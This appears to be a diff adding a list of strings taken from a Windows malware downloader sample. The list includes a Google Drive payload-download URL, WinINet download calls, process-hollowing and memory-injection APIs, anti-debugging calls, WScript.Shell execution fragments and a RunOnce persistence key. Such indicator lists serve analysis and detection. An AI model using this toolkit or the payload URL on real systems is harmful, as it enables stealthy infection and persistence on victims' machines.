@@ -1,0 +1,48 @@
+USERPROFILE=
+msvbvm60.dll
+\system32\
+\syswow64\
+\filename1.exe
+C:\Users\admin\Desktop\3C435EC59712B281078BFC219844FAF4.exe
+https://drive.google.com/uc?export=download&id=1OWggmrPsTfUnyDCt_YdDQU1dHfw52GC-
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+wininet.dll
+InternetOpenA
+InternetSetOptionA
+InternetOpenUrlA
+InternetReadFile
+InternetCloseHandle
+NtCreateSection
+NtMapViewOfSection
+NtGetContextThread
+NtSetContextThread
+NtProtectVirtualMemory
+NtAllocateVirtualMemory
+NtWriteVirtualMemory
+NtOpenFile
+NtResumeThread
+NtUnmapViewOfSection
+DbgBreakPoint
+DbgUiRemoteBreakin
+NtSetInformationThread
+LoadLibraryA
+CreateProcessInternalW
+GetLongPathNameW
+TerminateProcess
+CreateThread
+AddVectoredExceptionHandler
+TerminateThread
+CreateFileW
+GetFileSize
+CloseHandle
+RegCreateKeyExA
+RegSetValueExA
+EnumWindows
+Set W = CreateObject("WScript.Shell")
+Set C = W.Exec ("
+Startup key
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+SHCreateDirectoryExW
+ShellExecuteW
+PXPXPXRAPPXAQARPXASPXATAUAVAWVWSPXdH
+PX[_^A_A^A]A\PXA[AZAYAXPXZ
